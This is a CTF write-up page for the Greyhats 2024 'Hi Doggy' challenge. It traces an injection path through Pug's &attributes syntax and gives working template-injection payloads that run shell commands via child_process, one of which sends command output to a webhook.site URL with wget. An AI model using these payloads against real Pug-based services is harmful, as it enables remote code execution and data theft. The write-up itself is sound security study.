<!DOCTYPE html><html lang="en"><head>
    <meta charset="UTF-8">
    <link rel="icon" href="/ctf-writeups/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google-site-verification" content="dl1D1u59Q1pKaeEVUFtuHxnfuBFKhks8hA19r7WuxTY">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Judson:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Gabarito:wght@400..900&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght@400..600" rel="stylesheet">
    <title>Greyhats 2024 - Hi Doggy</title>
    <script type="module" crossorigin="" src="/ctf-writeups/assets/app-7e5aabe4.js"></script>
    <link rel="stylesheet" href="/ctf-writeups/assets/index-c9002530.css">
  <meta property="article:tag" content="Greyhats 2024"><meta property="article:tag" content="web"><meta name="description" content="This was the first challenge I solved during the CTF and it was also a first blood, which I was quite happy about.

# Challenge overview

The code is rather short, and the main part is as follows:

```javascript:index.js
app.post('/render', (req, res) => {
  const { template } = req.body;

  try {
    var lex = require('pug-lexer');
    var parse = require('pug-parser');
    var wrap = require('pug-runtime/wrap');
    var generateCode = require('pug-code-gen');

    const ast = parse(lex(template));
    console.dir(ast);
    const whitelistedNodes = ['Tag', 'Text', 'Comment', 'Block', 'Doctype', 'NamedBlock'];
    const filterNodes = (node) => {
      if (whitelistedNodes.includes(node.type)) {
        if (node.nodes) {
          node.nodes = node.nodes.map(filterNodes).filter(Boolean);
        }
        if (node.block) {
          node.block = filterNodes(node.block);
        }
        return node;
      }
    };
    const filteredAst = filterNodes(ast);
    const validateAttrs = (node) => {
      if (node.attrs) {
        node.attrs.forEach((attr) => {
          if (!/^(['&quot;])(?:(?:(?!\1).)|\\.)*\1$/.test(attr.val)) {
            throw new Error('Invalid attribute value: ' + attr.val);
          }
        });
      }
      if (node.nodes) {
        node.nodes.forEach(validateAttrs);
      }
      if (node.block) {
        validateAttrs(node.block);
      }
    };
    validateAttrs(filteredAst);
    const code = generateCode(filteredAst);
    console.log(code);
    const html = wrap(code)();

    res.send(html);
  } catch (error) {
    res.status(400).send(`Error rendering template: ${error.message}`);
  }
});
```

So, it is clearly SSTI with some filters (an SSTI jail, if you will). A whitelist instead of a blacklist narrows the search space quite a lot. So I dived right into the [Pug source code](https://github.com/pugjs/pug). Under the `pug/packages` folder, there are 3 main directories of interest: `pug-lexer`, `pug-parser`, and `pug-code-gen`. 

Here is a brief description of my understanding of how it works. A lexer converts raw string input into a sequence of tokens, such as numbers/symbols/identifiers. A parser then takes the sequence of tokens as input and constructs a sort of abstract syntax tree (AST), another abstraction that organises the data further. Finally, the code generator takes this AST and compiles it to javascript code by recursively visiting each node in the tree. This javascript code is then executed server side to produce the final HTML file sent to the client.

# Pug source code

So with this in mind, it would be a good idea to start looking in `pug-code-gen` to try and find an entrypoint for us to inject our JS code. I looked up how code is generated for each whitelisted node type. `visitTag` seemed to be the most promising:

```javascript:pug-code-gen/index.js
  visitTag: function(tag, interpolated) {
...

    function bufferName() {
      if (interpolated) self.bufferExpression(tag.expr);
      else self.buffer(name);
    }

...
```

Here, if `interpolated` is true, `this.bufferExpression` is called.

```javascript:pug-code-gen/index.js
  /**
   * Buffer the given `src` so it is evaluated at run time
   *
   * @param {String} src
   * @api public
   */

  bufferExpression: function(src) {
    if (isConstant(src)) {
      return this.buffer(toConstant(src) + '');
    }
    if (
      this.lastBufferedIdx == this.buf.length &amp;&amp;
      this.bufferedConcatenationCount < 100
    ) {
      this.bufferedConcatenationCount++;
      if (this.lastBufferedType === 'text') this.lastBuffered += '&quot;';
      this.lastBufferedType = 'code';
      this.lastBuffered += ' + (' + src + ')';
      this.buf[this.lastBufferedIdx - 1] =
        'pug_html = pug_html + (' +
        this.bufferStartChar +
        this.lastBuffered +
        ');';
    } else {
      this.bufferedConcatenationCount = 0;
      this.buf.push('pug_html = pug_html + (' + src + ');');
      this.lastBufferedType = 'code';
      this.bufferStartChar = '';
      this.lastBuffered = '(' + src + ')';
      this.lastBufferedIdx = this.buf.length;
    }
  },
```

From this information I deduced that the function is called whenever Pug wants to add raw JS code to the compilation result. It has a sister function `buffer`, which as the documentation suggests wraps the data in a string before adding it to the JS code:

```javascript:pug-code-gen/index.js
  /**
   * Buffer the given `str` exactly as is or with interpolation
   *
   * @param {String} str
   * @param {Boolean} interpolate
   * @api public
   */

  buffer: function(str) {
    var self = this;

    str = stringify(str);
    str = str.substr(1, str.length - 2);

    if (
      this.lastBufferedIdx == this.buf.length &amp;&amp;
      this.bufferedConcatenationCount < 100
    ) {
      if (this.lastBufferedType === 'code') {
        this.lastBuffered += ' + &quot;';
        this.bufferedConcatenationCount++;
      }
      this.lastBufferedType = 'text';
      this.lastBuffered += str;
      this.buf[this.lastBufferedIdx - 1] =
        'pug_html = pug_html + ' +
        this.bufferStartChar +
        this.lastBuffered +
        '&quot;;';
    } else {
      this.bufferedConcatenationCount = 0;
      this.buf.push('pug_html = pug_html + &quot;' + str + '&quot;;');
      this.lastBufferedType = 'text';
      this.bufferStartChar = '&quot;';
      this.lastBuffered = str;
      this.lastBufferedIdx = this.buf.length;
    }
  },
```

So it seems like most of the JS code generation is done through these 2 helper functions and thus the vulnerable code, whereever it is, probably calls `bufferExpression`.

Back to `visitTag`, I searched for where it is called with `interpolated = true`. It turns out this is only the case for an `InterpolatedTag` node:

```javascript:pug-code-gen/index.js
  visitInterpolatedTag: function(tag) {
    return this.visitTag(tag, true);
  },
```

However, `InterpolatedTag` is not one of the nodes in our whitelist. So we have to search somewhere else. I searched for all invocations of `this.bufferExpression` in the code (there are about 6). The one that seemed most relevant was in the `visitAttributes` function

```javascript:pug-code-gen/index.js
  visitAttributes: function(attrs, attributeBlocks) {
    if (attributeBlocks.length) {
      if (attrs.length) {
        var val = this.attrs(attrs);
        attributeBlocks.unshift(val);
      }
      if (attributeBlocks.length > 1) {
        this.bufferExpression(
          this.runtime('attrs') +
            '(' +
            this.runtime('merge') +
            '([' +
            attributeBlocks.join(',') +
            ']), ' +
            stringify(this.terse) +
            ')'
        );
      } else {
        this.bufferExpression(
          this.runtime('attrs') +
            '(' +
            attributeBlocks[0] +
            ', ' +
            stringify(this.terse) +
            ')'
        );
      }
    } else if (attrs.length) {
      this.attrs(attrs, true);
    }
  },
```

Recalling the SSTI filter for this challenge, there is also a check done for attributes:

```javascript:index.js
node.attrs.forEach((attr) => {
  if (!/^(['&quot;])(?:(?:(?!\1).)|\\.)*\1$/.test(attr.val)) {
    throw new Error('Invalid attribute value: ' + attr.val);
  }
});
```

ChatGPT told me that this regex checks that the attribute value is in an unescaped string. I scrutinized the regex and verified this through testing. So we can't inject through tag attributes, however there is the `attributeBlocks` parameter which is clearly injectable! But can we control it? It seems like `attributeBlocks` is a member of `tag`, and I eventually traced it its origin back to `pug-parser`. Here it is initialized in `parseTag`:

```javascript:pug-parser/index.js
  /**
   * tag (attrs | class | id)* (text | code | ':')? newline* block?
   */

  parseTag: function() {
    var tok = this.advance();
    var tag = {
      type: 'Tag',
      name: tok.val,
      selfClosing: false,
      block: this.emptyBlock(tok.loc.start.line),
      attrs: [],
      attributeBlocks: [], // <-- here!
      isInline: inlineTags.indexOf(tok.val) !== -1,
      line: tok.loc.start.line,
      column: tok.loc.start.column,
      filename: this.filename,
    };

    return this.tag(tag, {selfClosingAllowed: true});
  },
```

This attribute is only written to in one function:

```javascript:pug-parser/index.js
  tag: function(tag, options) {
    var seenAttrs = false;
    var attributeNames = [];
    var selfClosingAllowed = options &amp;&amp; options.selfClosingAllowed;
    // (attrs | class | id)*
    out: while (true) {
      switch (this.peek().type) {
        ...
        case '&amp;attributes':
          var tok = this.advance();
          tag.attributeBlocks.push({
            type: 'AttributeBlock',
            val: tok.val,
            line: tok.loc.start.line,
            column: tok.loc.start.column,
            filename: this.filename,
          });
          break;
        ...
```

A google search sheds more light onto what this is: [Pug attributes](https://pugjs.org/language/attributes.html#attributes)

```plaintext
Pronounced as “and attributes”, the &amp;attributes syntax can be used to explode an object into attributes of an element.

div#foo(data-bar=&quot;foo&quot;)&amp;attributes({'data-foo': 'bar'})

<div id=&quot;foo&quot; data-bar=&quot;foo&quot; data-foo=&quot;bar&quot;></div>
```

So after the `&amp;attributes` token, we take the next token and set it as the `val`. And later in `pug-code-gen`, this val is inserted directly into the JS code without validation or stringifying it! I looked into `pug-lexer` to see what type of token would be best suited for this. Then I found the code where an attributeBlock is lexed:

```javascript:pug-lexer/index.js
  /**
   * &amp;attributes block
   */
  attributesBlock: function() {
    if (/^&amp;attributes\b/.test(this.input)) {
      var consumed = 11;
      this.consume(consumed);
      var tok = this.tok('&amp;attributes');
      this.incrementColumn(consumed);
      var args = this.bracketExpression();
      consumed = args.end + 1;
      this.consume(consumed);
      tok.val = args.src;
      this.incrementColumn(consumed);
      this.tokens.push(this.tokEnd(tok));
      return true;
    }
  },
```

As you can see, only a `bracketExpression` is allowed after the `&amp;attributes` token.

```javascript:pug-lexer/index.js
  bracketExpression: function(skip) {
    skip = skip || 0;
    var start = this.input[skip];
    assert(
      start === '(' || start === '{' || start === '[',
      'The start character should be &quot;(&quot;, &quot;{&quot; or &quot;[&quot;'
    );
```


So we can use `()`, `[]` or `{}` brackets, and the token value will be everything in between. I chose curly brackets so that I could make function calls in the code without ambiguity, and tested the following payload locally:

```plaintext
div&amp;attributes{global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync('touch pwned.txt')}
```

# Testing environment setup

At this point it may be a good idea to briefly describe how I set up the environment for testing locally. The relevant dockerfiles were provided along with the source code, but I just ran node from my machine because it was faster (and the behavior probably won't have significant changes). I just added two print statements, a `console.dir(ast)` to see the node types, and a `console.log(code)` at the end to check the JS code run.

# Final payload

Going back to the challenge, the payload I submitted worked flawlessly. The problem now is that there isn't a straightforward way to display the command result, so I made a call to a webhook.site.

```plaintext
div&amp;attributes{global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync('wget https://webhook.site/6964b783-05f8-4a10-be20-817e961902bb?t=`/readflag GIVEFLAGPLS`')}
```

In retrospect, webhook was unnecessary, and I could just as well have done:

```plaintext
input&amp;attributes({value: global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync('/readflag GIVEFLAGPLS').toString()})
```

In either case, I got the flag: `grey{I_cAn'T_THInK_0F_AnytHing_clever_T0_pu7_h3r3}`.

Overall, quite a cool challenge that tests your code-auditing abilities.
"><meta name="author" content="Jia Jie"></head>
  <body>
    <div id="app" data-server-rendered="true"><div><div class="w-full fixed z-20 bg-[#1e1e1e] flex flex-col items-center transition-transform duration-500"><div class="w-full h-16 flex-shrink-0 flex items-center justify-between px-10 max-sm:px-5 max-sm:h-14"><div class="w-10 h-10 flex flex-col items-center justify-center gap-y-1 cursor-pointer mr-3 xl:hidden" data-v-eaee368e=""><div class="bar b1" data-v-eaee368e=""></div><div class="bar b2" data-v-eaee368e=""></div><div class="bar b3" data-v-eaee368e=""></div></div><span class="text-xl font-semibold">Jia Jie's writeups</span><div class="flex-1"></div><button class="group w-10 h-10 rounded-full grid place-items-center"><i class="material-symbols-outlined text-2xl transition-colors group-hover:text-primary">search</i></button><a href="https://github.com/mkofdwu/ctf-writeups" target="_blank" class="group w-10 h-10 rounded-full grid place-items-center"><svg width="28" height="28" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg" class="transition-colors fill-white group-hover:fill-primary"><path d="M18.0015 3C9.71403 3 3.00153 9.7125 3.00153 18C2.99972 21.1487 3.98943 24.2181 5.83024 26.7727C7.67106 29.3273 10.2695 31.2373 13.257 32.232C14.007 32.3625 14.289 31.9125 14.289 31.518C14.289 31.1625 14.2695 29.982 14.2695 28.725C10.5015 29.4195 9.52653 27.807 9.22653 26.9625C9.05703 26.5305 8.32653 25.2 7.68903 24.843C7.16403 24.5625 6.41403 23.868 7.66953 23.85C8.85153 23.8305 9.69453 24.9375 9.97653 25.3875C11.3265 27.6555 13.482 27.018 14.3445 26.625C14.4765 25.65 14.8695 24.9945 15.3015 24.6195C11.964 24.2445 8.47653 22.95 8.47653 17.2125C8.47653 15.5805 9.05703 14.232 10.014 13.1805C9.86403 12.8055 9.33903 11.268 10.164 9.2055C10.164 9.2055 11.4195 8.8125 14.289 10.7445C15.5101 10.4056 16.7718 10.235 18.039 10.2375C19.314 10.2375 20.589 10.4055 21.789 10.743C24.6585 8.793 25.914 9.207 25.914 9.207C26.739 11.2695 26.214 12.807 26.064 13.182C27.0195 14.232 27.6015 15.5625 27.6015 17.2125C27.6015 22.9695 24.096 24.2445 20.757 24.6195C21.3015 25.0875 21.771 25.9875 21.771 27.3945C21.771 29.4 21.7515 31.0125 21.7515 31.5195C21.7515 31.9125 22.0335 32.3805 22.7835 32.2305C25.7608 31.2249 28.3478 29.3111 30.1805 26.7584C32.0132 24.2056 32.9993 21.1425 33 18C33 9.7125 26.2875 3 18 3H18.0015Z"></path></svg></a><a href="https://mkofdwu.github.io/" target="_blank" class="main-website-btn group h-10 pl-4 pr-2 ml-3 flex items-center font-semibold rounded-full border max-[500px]:hidden transition-all duration-500 hover:border-primary hover:text-black"> main website <i class="material-symbols-outlined text-2xl text-xl ml-2 transition-colors duration-500 group-hover:text-black">arrow_outward</i></a><div class="h-0 hide-scrollbar fixed left-0 top-16 z-10 w-full bg-black overflow-y-auto origin-top duration-300 transition-all xl:hidden max-sm:top-14"><div class="opacity-0 pt-10 duration-300 transition-opacity"><div class="flex flex-col" full-width="true"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a aria-current="page" href="/ctf-writeups/hi-doggy" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div></div></div></div><div class="dotted-line-hori z-10 w-[calc(100vw-5rem)] max-sm:w-screen"></div></div><div class="fixed z-10 w-[17.5rem] h-screen overflow-y-hidden flex max-xl:hidden"><div class="flex flex-col hide-scrollbar h-full overflow-y-auto pt-24 pr-8"><!--[--><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2024</span><!--[--><a href="/ctf-writeups/navigating-the-digital-labyrinth" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/language-labyrinth-and-graphicsmagick" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/digging-up-history" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/alligatorpay" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/hardware-isnt-that-hard" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/noncevigator" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a aria-current="page" href="/ctf-writeups/hi-doggy" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a href="/ctf-writeups/push-and-pickle" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" 